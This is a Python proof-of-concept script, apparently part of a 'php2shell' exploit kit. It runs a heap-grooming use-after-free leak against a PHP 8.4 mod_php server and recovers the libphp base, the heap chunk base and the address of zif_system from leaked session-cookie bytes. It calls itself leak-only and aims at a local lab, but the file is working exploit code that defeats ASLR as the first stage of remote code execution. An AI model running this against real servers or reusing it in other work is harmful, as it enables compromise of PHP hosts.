#!/usr/bin/env python3
"""Rung 6 — in-band PS(id) cookie disclosure on a stock mod_php lab.

This removes the `[UAFDBG]` calibration crutch: no instrumentation, no
docker log, no local file access. It runs the public leak-A/leak-B shape
against the stock `php:8.4.26-apache` lab (`lab-pure-modphp/:18110`) and
derives the libphp and ZendMM chunk bases from the `Set-Cookie` bytes.

Usage:
  python3 poc/verify_psid_leak.py --target http://127.0.0.1:18110 --oom-mb 40
  python3 poc/verify_psid_leak.py --self-test
  python3 poc/verify_psid_leak.py --target http://127.0.0.1:18110 --sweep

Honest scope: leak-only. It does not fire a command and does not ship a
remote target pack; see docs/PLAN.md ("no remote leak stage" is lifted only
for this repo's own lab, with the fixed benign allowlist unchanged).
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import leak, probe, sapi
from php2shell.pinning import WorkerPinner


def print_result(res, offsets_key):
    print(f"    leak-A/B notes:")
    for n in res.notes:
        print(f"      - {n}")
    print()
    print(f"    cookie: {res.cookie_len} bytes "
          f"({'disclosure' if res.disclosed else 'normal id'})")
    if not res.disclosed:
        print("[!] No in-band disclosure in this run.")
        print("    The public shape is heap-layout sensitive: try --sweep,")
        print("    a different --oom-mb, or a build-matched offset profile.")
        print("    A normal 32-char cookie proves the request was handled but")
        print("    the array did not reclaim PS(id)-0x10.")
        return 1

    print(f"    libphp base:   {hex(res.libphp_base) if res.libphp_base else '-'}")
    print(f"    chunk base:    {hex(res.chunk_base) if res.chunk_base else '-'}")
    print(f"    zif_system:    {hex(res.zif_system) if res.zif_system else '-'}")
    if res.libphp_votes:
        print("    libphp vote candidates (top 4):")
        for base, votes in list(res.libphp_votes.items())[:4]:
            print(f"      {hex(base)}  x{votes}")
    if res.chunk_votes:
        print("    chunk vote candidates (top 4):")
        for base, votes in list(res.chunk_votes.items())[:4]:
            print(f"      {hex(base)}  x{votes}")
    print()
    if res.libphp_base:
        print("[EVIDENCE] IN-BAND ADDRESS DISCLOSURE REPRODUCED")
        print(f"    - the response cookie carried {res.cookie_len} bytes of")
        print("      URL-encoded heap from the dangling PS(id);")
        print("    - the recurring zval_ptr_dtor pointer minus the public")
        print(f"      offset ({offsets_key}) yields libphp base")
        print(f"      {hex(res.libphp_base)};")
        print("    - the 2 MiB-aligned arData pointers yield the ZendMM")
        print(f"      chunk base {hex(res.chunk_base) if res.chunk_base else '-'}.")
        print("    - This is the capability Wiz reports as missing from public")
        print("      kits: ASLR is now sourced in-band, not from [UAFDBG].")
        return 0
    print("[!] Disclosed bytes did not contain a matching page-aligned")
    print("    zval_ptr_dtor pointer. The build/profile may not match; check")
    print("    php2shell/leak.py OFFSETS and the image tag.")
    return 1


def run_attempt(host, port, path, offsets, holders=0, **kw):
    if holders:
        with WorkerPinner(host, port, holders=holders):
            return leak.attempt(host, port, path, offsets=offsets, **kw)
    return leak.attempt(host, port, path, offsets=offsets, **kw)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18110")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--profile", default="php-8.4.26-bookworm-amd64",
                    help="offset-table key (see php2shell/leak.py OFFSETS)")
    ap.add_argument("--oom-mb", type=float, default=40.0)
    ap.add_argument("--n-vars-a", type=int, default=1001)
    ap.add_argument("--n-vars-b", type=int, default=742,
                    help="leak-B top-level array names (public: 742)")
    ap.add_argument("--array-len", type=int, default=257)
    ap.add_argument("--array-target", type=int, default=447,
                    help="which array name carries the 257 elements")
    ap.add_argument("--holders", type=int, default=3,
                    help="stalled workers to hold so leak-A/B hit one child "
                         "(0 = no pinning; requires a single-worker target)")
    ap.add_argument("--sweep", action="store_true",
                    help="try a small grid of layout parameters")
    ap.add_argument("--self-test", action="store_true",
                    help="deterministic derivation test (no network)")
    args = ap.parse_args()

    if args.self_test:
        res = leak.self_test()
        print("[*] Derivation self-test")
        print(f"    libphp  {hex(res.libphp_base) if res.libphp_base else '-'}")
        print(f"    chunk   {hex(res.chunk_base) if res.chunk_base else '-'}")
        print(f"    zif     {hex(res.zif_system) if res.zif_system else '-'}")
        ok = res.libphp_base == 0x7F1234500000 and res.chunk_base == 0x7F1234C00000
        print("[EVIDENCE] derivation " + ("OK" if ok else "FAILED"))
        return 0 if ok else 1

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    prof = sapi.profile(host, port)
    print("[*] Rung 6 — in-band PS(id) cookie disclosure")
    print(f"    target: {host}:{port}{args.path}")
    print(f"    php={prof.get('php_version')} sapi={prof.get('sapi')} "
          f"memory_limit={prof.get('memory_limit')} "
          f"post_max_size={prof.get('post_max_size')}")
    print(f"    profile: {args.profile}")
    print()

    offsets = {args.profile: leak.OFFSETS[args.profile]} if args.profile in leak.OFFSETS else leak.OFFSETS
    if args.profile not in leak.OFFSETS:
        print(f"    [!] unknown profile {args.profile!r}; using all known offsets")
        print()

    if args.sweep:
        grid = [
            (40, 1001, 742, 257, 447),
            (40, 1001, 742, 256, 447),
            (40, 1001, 742, 257, 443),
            (40, 1001, 741, 257, 447),
            (40, 1001, 743, 257, 447),
            (36, 1001, 742, 257, 447),
            (44, 1001, 742, 257, 447),
        ]
        for i, (mb, na, nb, al, tgt) in enumerate(grid, 1):
            print(f"[{i}/{len(grid)}] oom={mb}MB n_a={na} n_b={nb} "
                  f"array={al} target={tgt}")
            res = run_attempt(host, port, args.path, offsets,
                              holders=args.holders, oom_mb=mb, n_vars_a=na,
                              n_vars_b=nb, array_len=al, target=tgt,
                              timeout=90)
            if res.disclosed:
                return print_result(res, args.profile)
            print(f"    -> cookie {res.cookie_len}B, no disclosure")
        print()
        print("[!] sweep exhausted without disclosure.")
        return 1

    res = run_attempt(host, port, args.path, offsets,
                      holders=args.holders, oom_mb=args.oom_mb,
                      n_vars_a=args.n_vars_a, n_vars_b=args.n_vars_b,
                      array_len=args.array_len,
                      target=args.array_target, timeout=90)
    return print_result(res, args.profile)


if __name__ == "__main__":
    raise SystemExit(main())
